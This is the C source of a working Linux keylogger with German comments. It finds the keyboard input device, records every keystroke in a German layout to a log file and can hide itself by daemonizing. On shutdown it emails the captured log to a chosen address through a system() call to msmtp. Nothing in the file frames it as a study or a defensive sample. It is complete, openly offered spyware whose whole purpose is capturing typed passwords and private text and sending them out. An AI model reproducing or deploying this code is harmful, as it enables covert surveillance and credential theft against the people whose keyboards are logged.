#include <linux/input-event-codes.h>
#include <stdio.h>
#include <fcntl.h>
#include <linux/input.h>
#include <unistd.h>
#include <stdlib.h>
#include <signal.h>
#include <string.h>

#include <sys/ioctl.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <ctype.h>
#include <errno.h>
#include <time.h>

#define VERSION "1.5"

// Globale Variablen für Signal-Handling
volatile sig_atomic_t running = 1;
FILE *logfile = NULL;
int input_fd = -1;
char *email_address = NULL;
char *global_logfilepath = NULL;

void handle_signal(int signum) {
    (void)signum;
    running = 0;
}

void cleanup() {
    if (logfile) {
        time_t t = time(NULL);
        struct tm tm = *localtime(&t);
        fprintf(logfile, "\n=== Session beendet: %02d.%02d.%02d %02d:%02d:%02d ===\n", 
                tm.tm_mday, tm.tm_mon + 1, tm.tm_year % 100, 
                tm.tm_hour, tm.tm_min, tm.tm_sec);
        fclose(logfile);
        logfile = NULL;
    }
    if (input_fd != -1) {
        close(input_fd);
        input_fd = -1;
    }
    
    // Email senden, falls konfiguriert
    if (email_address && global_logfilepath) {
        char command[1024];
        // Construct command with Subject header
        // Format: (echo "Subject: ..."; echo; cat logfile) | msmtp email
        snprintf(command, sizeof(command), 
                 "(echo \"Subject: Keylog %s\"; echo; cat \"%s\") | msmtp \"%s\"", 
                 VERSION, global_logfilepath, email_address);
        system(command);
    }
}

// Helper für Ausgabe
void log_key(const char *str) {
    if (str && logfile) {
        fprintf(logfile, "%s", str);
        fflush(logfile);
    }
}

// Case insensitive string search helper
int contains_valid_name(const char *name) {
    // Suche nach "keyboard" oder "tastatur" (case insensitive)
    if (strcasestr(name, "keyboard") || strcasestr(name, "tastatur")) {
        return 1;
    }
    return 0;
}

char *find_keyboard_device() {
    static char path[64];
    char name[256];
    
    // Scanne event0 bis event20
    for (int i = 0; i <= 20; ++i) {
        snprintf(path, sizeof(path), "/dev/input/event%d", i);
        int fd = open(path, O_RDONLY);
        if (fd < 0) continue;

        if (ioctl(fd, EVIOCGNAME(sizeof(name)), name) >= 0) {
            if (contains_valid_name(name)) {
                printf("Tastatur gefunden: %s (%s)\n", name, path);
                close(fd);
                return path;
            }
        }
        close(fd);
    }
    return NULL;
}

void daemonize() {
    pid_t pid;

    // 1. Fork
    pid = fork();
    if (pid < 0) exit(EXIT_FAILURE);
    if (pid > 0) exit(EXIT_SUCCESS); // Parent beenden

    // 2. Neue Session
    if (setsid() < 0) exit(EXIT_FAILURE);

    // 3. Signal handling
    signal(SIGCHLD, SIG_IGN);
    signal(SIGHUP, SIG_IGN);

    // 4. Fork erneut
    pid = fork();
    if (pid < 0) exit(EXIT_FAILURE);
    if (pid > 0) exit(EXIT_SUCCESS);

    // 5. Umask
    umask(0);

    // 6. Working Directory ändern (damit Filesystem nicht blockiert wird)
    chdir("/");

    // 7. Filedeskriptoren schließen/umleiten
    for (int x = sysconf(_SC_OPEN_MAX); x >= 0; x--) {
        // Logfile und Input Device offen lassen!
        if (logfile && x == fileno(logfile)) continue;
        if (input_fd != -1 && x == input_fd) continue;
        close(x);
    }
    
    // stdin/out/err nach /dev/null
    int fd0 = open("/dev/null", O_RDWR);
    int fd1 = dup(0);
    int fd2 = dup(0);
    (void)fd0;
    (void)fd1;
    (void)fd2;
}

// Lookup Tables
const char *keymap[KEY_MAX] = {0};
const char *keymap_shift[KEY_MAX] = {0};

void init_keymaps() {
    // Standard Tasten
    keymap[KEY_A] = "a"; keymap_shift[KEY_A] = "A";
    keymap[KEY_B] = "b"; keymap_shift[KEY_B] = "B";
    keymap[KEY_C] = "c"; keymap_shift[KEY_C] = "C";
    keymap[KEY_D] = "d"; keymap_shift[KEY_D] = "D";
    keymap[KEY_E] = "e"; keymap_shift[KEY_E] = "E";
    keymap[KEY_F] = "f"; keymap_shift[KEY_F] = "F";
    keymap[KEY_G] = "g"; keymap_shift[KEY_G] = "G";
    keymap[KEY_H] = "h"; keymap_shift[KEY_H] = "H";
    keymap[KEY_I] = "i"; keymap_shift[KEY_I] = "I";
    keymap[KEY_J] = "j"; keymap_shift[KEY_J] = "J";
    keymap[KEY_K] = "k"; keymap_shift[KEY_K] = "K";
    keymap[KEY_L] = "l"; keymap_shift[KEY_L] = "L";
    keymap[KEY_M] = "m"; keymap_shift[KEY_M] = "M";
    keymap[KEY_N] = "n"; keymap_shift[KEY_N] = "N";
    keymap[KEY_O] = "o"; keymap_shift[KEY_O] = "O";
    keymap[KEY_P] = "p"; keymap_shift[KEY_P] = "P";
    keymap[KEY_Q] = "q"; keymap_shift[KEY_Q] = "Q";
    keymap[KEY_R] = "r"; keymap_shift[KEY_R] = "R";
    keymap[KEY_S] = "s"; keymap_shift[KEY_S] = "S";
    keymap[KEY_T] = "t"; keymap_shift[KEY_T] = "T";
    keymap[KEY_U] = "u"; keymap_shift[KEY_U] = "U";
    keymap[KEY_V] = "v"; keymap_shift[KEY_V] = "V";
    keymap[KEY_W] = "w"; keymap_shift[KEY_W] = "W";
    keymap[KEY_X] = "x"; keymap_shift[KEY_X] = "X";
    keymap[KEY_Y] = "z"; keymap_shift[KEY_Y] = "Z"; // DE Layout Y/Z
    keymap[KEY_Z] = "y"; keymap_shift[KEY_Z] = "Y"; // DE Layout Y/Z

    // Zahlen
    keymap[KEY_1] = "1"; keymap_shift[KEY_1] = "!";
    keymap[KEY_2] = "2"; keymap_shift[KEY_2] = "\"";
    keymap[KEY_3] = "3"; keymap_shift[KEY_3] = "§";
    keymap[KEY_4] = "4"; keymap_shift[KEY_4] = "$";
    keymap[KEY_5] = "5"; keymap_shift[KEY_5] = "%";
    keymap[KEY_6] = "6"; keymap_shift[KEY_6] = "&";
    keymap[KEY_7] = "7"; keymap_shift[KEY_7] = "/";
    keymap[KEY_8] = "8"; keymap_shift[KEY_8] = "(";
    keymap[KEY_9] = "9"; keymap_shift[KEY_9] = ")";
    keymap[KEY_0] = "0"; keymap_shift[KEY_0] = "=";

    // Sonderzeichen DE Layout
    keymap[KEY_COMMA] = ","; keymap_shift[KEY_COMMA] = ";";
    keymap[KEY_DOT] = "."; keymap_shift[KEY_DOT] = ":";
    keymap[KEY_MINUS] = "ß"; keymap_shift[KEY_MINUS] = "?";
    keymap[KEY_EQUAL] = "´"; keymap_shift[KEY_EQUAL] = "`";
    keymap[KEY_LEFTBRACE] = "ü"; keymap_shift[KEY_LEFTBRACE] = "Ü";
    keymap[KEY_RIGHTBRACE] = "+"; keymap_shift[KEY_RIGHTBRACE] = "*";
    keymap[KEY_SEMICOLON] = "ö"; keymap_shift[KEY_SEMICOLON] = "Ö";
    keymap[KEY_APOSTROPHE] = "ä"; keymap_shift[KEY_APOSTROPHE] = "Ä";
    keymap[KEY_GRAVE] = "^"; keymap_shift[KEY_GRAVE] = "°";
    keymap[KEY_BACKSLASH] = "#"; keymap_shift[KEY_BACKSLASH] = "'";
    keymap[KEY_SLASH] = "-"; keymap_shift[KEY_SLASH] = "_";
    keymap[KEY_102ND] = "<"; keymap_shift[KEY_102ND] = ">";
    
    // Steuerzeichen
    keymap[KEY_SPACE] = " "; keymap_shift[KEY_SPACE] = " ";
    keymap[KEY_ENTER] = "\n"; keymap_shift[KEY_ENTER] = "\n";
    keymap[KEY_KPENTER] = "\n"; keymap_shift[KEY_KPENTER] = "\n";
    keymap[KEY_TAB] = "[TAB]"; keymap_shift[KEY_TAB] = "[SHIFT+TAB]";
    keymap[KEY_BACKSPACE] = "[BACKSPACE]"; keymap_shift[KEY_BACKSPACE] = "[BACKSPACE]";
    keymap[KEY_ESC] = "[ESC]"; keymap_shift[KEY_ESC] = "[ESC]";
    keymap[KEY_DELETE] = "[DELETE]"; keymap_shift[KEY_DELETE] = "[DELETE]";
    
    // Navigation & Modifier (Mapping für Ausgabe)
    keymap[KEY_LEFTCTRL] = "[CTRL]"; keymap_shift[KEY_LEFTCTRL] = "[CTRL]";
    keymap[KEY_RIGHTCTRL] = "[CTRL]"; keymap_shift[KEY_RIGHTCTRL] = "[CTRL]";
    keymap[KEY_LEFTALT] = "[ALT]"; keymap_shift[KEY_LEFTALT] = "[ALT]";
    keymap[KEY_RIGHTALT] = "[ALT]"; keymap_shift[KEY_RIGHTALT] = "[ALT]";
    keymap[KEY_LEFTMETA] = "[META]"; keymap_shift[KEY_LEFTMETA] = "[META]";
    keymap[KEY_RIGHTMETA] = "[META]"; keymap_shift[KEY_RIGHTMETA] = "[META]";
    
    keymap[KEY_UP] = "[UP]"; keymap_shift[KEY_UP] = "[UP]";
    keymap[KEY_DOWN] = "[DOWN]"; keymap_shift[KEY_DOWN] = "[DOWN]";
    keymap[KEY_LEFT] = "[LEFT]"; keymap_shift[KEY_LEFT] = "[LEFT]";
    keymap[KEY_RIGHT] = "[RIGHT]"; keymap_shift[KEY_RIGHT] = "[RIGHT]";
    keymap[KEY_HOME] = "[HOME]"; keymap_shift[KEY_HOME] = "[HOME]";
    keymap[KEY_END] = "[END]"; keymap_shift[KEY_END] = "[END]";
    keymap[KEY_PAGEUP] = "[PAGEUP]"; keymap_shift[KEY_PAGEUP] = "[PAGEUP]";
    keymap[KEY_PAGEDOWN] = "[PAGEDOWN]"; keymap_shift[KEY_PAGEDOWN] = "[PAGEDOWN]";
    keymap[KEY_INSERT] = "[INSERT]"; keymap_shift[KEY_INSERT] = "[INSERT]";
    
    // Numpad
    keymap[KEY_NUMLOCK] = "[NUMLOCK]"; keymap_shift[KEY_NUMLOCK] = "[NUMLOCK]";
    keymap[KEY_KPASTERISK] = "*"; keymap_shift[KEY_KPASTERISK] = "*";
    keymap[KEY_KPMINUS] = "-"; keymap_shift[KEY_KPMINUS] = "-";
    keymap[KEY_KPPLUS] = "+"; keymap_shift[KEY_KPPLUS] = "+";
    keymap[KEY_KPDOT] = ","; keymap_shift[KEY_KPDOT] = ",";
    keymap[KEY_KPSLASH] = "/"; keymap_shift[KEY_KPSLASH] = "/";
    keymap[KEY_KP0] = "0"; keymap_shift[KEY_KP0] = "0";
    keymap[KEY_KP1] = "1"; keymap_shift[KEY_KP1] = "1";
    keymap[KEY_KP2] = "2"; keymap_shift[KEY_KP2] = "2";
    keymap[KEY_KP3] = "3"; keymap_shift[KEY_KP3] = "3";
    keymap[KEY_KP4] = "4"; keymap_shift[KEY_KP4] = "4";
    keymap[KEY_KP5] = "5"; keymap_shift[KEY_KP5] = "5";
    keymap[KEY_KP6] = "6"; keymap_shift[KEY_KP6] = "6";
    keymap[KEY_KP7] = "7"; keymap_shift[KEY_KP7] = "7";
    keymap[KEY_KP8] = "8"; keymap_shift[KEY_KP8] = "8";
    keymap[KEY_KP9] = "9"; keymap_shift[KEY_KP9] = "9";
    
    // F-Keys
    keymap[KEY_F1] = "[F1]"; keymap_shift[KEY_F1] = "[F1]";
    keymap[KEY_F2] = "[F2]"; keymap_shift[KEY_F2] = "[F2]";
    keymap[KEY_F3] = "[F3]"; keymap_shift[KEY_F3] = "[F3]";
    keymap[KEY_F4] = "[F4]"; keymap_shift[KEY_F4] = "[F4]";
    keymap[KEY_F5] = "[F5]"; keymap_shift[KEY_F5] = "[F5]";
    keymap[KEY_F6] = "[F6]"; keymap_shift[KEY_F6] = "[F6]";
    keymap[KEY_F7] = "[F7]"; keymap_shift[KEY_F7] = "[F7]";
    keymap[KEY_F8] = "[F8]"; keymap_shift[KEY_F8] = "[F8]";
    keymap[KEY_F9] = "[F9]"; keymap_shift[KEY_F9] = "[F9]";
    keymap[KEY_F10] = "[F10]"; keymap_shift[KEY_F10] = "[F10]";
    keymap[KEY_F11] = "[F11]"; keymap_shift[KEY_F11] = "[F11]";
    keymap[KEY_F12] = "[F12]"; keymap_shift[KEY_F12] = "[F12]";
}

int main(int argc, char *argv[]) {
    // Argumente parsen
    int daemon_mode = 0;
    char *eventfile = NULL;
    char *logfilepath = NULL;
    
    int positional_args = 0;
    char *pos_args[2] = {NULL, NULL}; // Max 2 positionale: evdev, logfile

    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "-d") == 0 || strcmp(argv[i], "--daemon") == 0) {
            daemon_mode = 1;
        } else if (strcmp(argv[i], "-v") == 0 || strcmp(argv[i], "--version") == 0) {
            printf("Keylogger Version: "VERSION"\n");
            return 0;
        } else if ((strcmp(argv[i], "-m") == 0 || strcmp(argv[i], "--mail") == 0) && i + 1 < argc) {
            email_address = argv[++i];
        } else if (argv[i][0] != '-') {
            if (positional_args < 2) {
                pos_args[positional_args++] = argv[i];
            } else {
                fprintf(stderr, "Zu viele Argumente.\n");
                return 1;
            }
        }
    }

    if (positional_args == 1) {
        logfilepath = pos_args[0]; // Nur Logfile gegeben -> Auto-Detect Device
        eventfile = find_keyboard_device();
        if(!eventfile) {
            fprintf(stderr, "Konnte keine Tastatur finden. Bitte Pfad manuell angeben.\n");
            return 1;
        }
    } else if (positional_args == 2) {
        eventfile = pos_args[0];
        logfilepath = pos_args[1];
    } else {
        printf("USAGE: %s [-d] [-m email] [path-to-event-file] <path-to-log-file>\n", argv[0]);
        return 1;
    }

    // Pfad für Logfile absolut machen (einfacher Hack), falls Daemon Mode, 
    // da Daemon chdir("/") macht.
    // Wir machen das jetzt unten nach dem Öffnen mit realpath().
    // Aber: Wir öffnen File *vor* Daemonize, also passt der Pfad relativ noch.
    // Filepointer bleibt offen.

    init_keymaps();

    // Signal Handler registrieren
    signal(SIGINT, handle_signal);
    signal(SIGTERM, handle_signal);

    logfile = fopen(logfilepath, "a");
    if (logfile == NULL) {
        perror("fopen logfile");
        return -1;
    }
    
    // Resolve absolute path for msmtp usage (especially for daemon mode)
    global_logfilepath = realpath(logfilepath, NULL);
    if (!global_logfilepath) {
        // Fallback, should unlikely settle here if fopen succeeded
        global_logfilepath = logfilepath; 
    }

    setbuf(logfile, NULL); // Unbuffered, oder fflush manuell

    printf("Benutze Device: %s\n", eventfile);
    input_fd = open(eventfile, O_RDONLY);
    if (input_fd == -1) {
        perror("open eventfile");
        fclose(logfile);
        return -1;
    }
    
    // Grab device exclusive? (Optional, hier nicht implementiert um System nicht zu blockieren wenn Crash)
    // ioctl(input_fd, EVIOCGRAB, 1); 

    if (daemon_mode) {
        printf("Starte im Hintergrund...\n");
        daemonize();
    } else {
        printf("Keylogger gestartet. Schreibe in %s\nDrücke Strg+C zum Beenden.\n", logfilepath);
    }
    
    time_t t = time(NULL);
    struct tm tm = *localtime(&t);
    fprintf(logfile, "\n=== Session gestartet: %02d.%02d.%02d %02d:%02d:%02d ===\n",
            tm.tm_mday, tm.tm_mon + 1, tm.tm_year % 100,
            tm.tm_hour, tm.tm_min, tm.tm_sec);
    fflush(logfile);

    struct input_event inputevent;
    ssize_t bytes;
    int shift_pressed = 0;
    int capslock_active = 0;

    while (running) {
        bytes = read(input_fd, &inputevent, sizeof(inputevent));
        
        if (bytes < (ssize_t)sizeof(inputevent)) {
             if (running && errno != EINTR) perror("read");
             break;
        }

        if (inputevent.type == EV_KEY) {
            // Status Updates für Modifier
            if (inputevent.code == KEY_LEFTSHIFT || inputevent.code == KEY_RIGHTSHIFT) {
                shift_pressed = (inputevent.value == 1 || inputevent.value == 2);
            }
            if (inputevent.code == KEY_CAPSLOCK && inputevent.value == 1) {
                capslock_active = !capslock_active;
            }

            // Nur Key Press (1) oder Autorepeat (2) verarbeiten
            if (inputevent.value == 1 || inputevent.value == 2) {
                // Modifier selbst nicht loggen, ausser man will es
                if (inputevent.code == KEY_LEFTSHIFT || inputevent.code == KEY_RIGHTSHIFT || 
                    inputevent.code == KEY_CAPSLOCK) {
                    continue;
                }

                const char *output = NULL;
                
                int use_shift = shift_pressed;
                
                // Simple Capslock logic
                if (capslock_active) {
                     if ((inputevent.code >= KEY_Q && inputevent.code <= KEY_P) || 
                         (inputevent.code >= KEY_A && inputevent.code <= KEY_L) || 
                         (inputevent.code >= KEY_Z && inputevent.code <= KEY_M)) {
                         use_shift = !use_shift;
                     }
                }

                if (inputevent.code < KEY_MAX) {
                    if (use_shift && keymap_shift[inputevent.code]) {
                        output = keymap_shift[inputevent.code];
                    } else if (keymap[inputevent.code]) {
                        output = keymap[inputevent.code];
                    }
                }

                if (output) {
                    log_key(output);
                } else {
                    // Unbekannte Tasten formatieren
                    char buf[32];
                    snprintf(buf, sizeof(buf), "[KEY_%d]", inputevent.code);
                    log_key(buf);
                }
            }
        }
    }

    cleanup();
    return 0;
}
